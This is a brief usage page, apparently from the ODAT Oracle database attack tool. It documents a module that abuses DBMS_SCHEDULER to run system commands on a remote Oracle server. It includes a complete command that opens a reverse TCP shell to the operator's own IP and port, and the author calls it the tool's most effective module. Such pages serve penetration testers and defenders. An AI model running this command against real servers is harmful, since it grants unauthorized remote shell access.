# Get a reverse shell

This module can be used to execute system commands on a remote database server. Useful to get a __reverse tcp shell__.

__Note 1__: It is not possible to:

 ~ get the output of the system command

 ~ to give some special characters in arguments to the system command (ex: *>*)

* To get a reverse tcp shell when the remote database server is a Linux:
```bash
./odat.py dbmsscheduler -s $SERVER -d $SID -U $USER -P $PASSWORD --reverse-shell $MY_IP $A_LOCAL_PORT
```
__Note 2__: You don't need to open a listen port manually to have a reverse tcp shell: The module will open the specified port for you.

> I think it is the __most useful__ and __most effective__ module: Many times I have meet Oracle users who can use the Oracle DBMS_SCHEDULER library but not JAVA.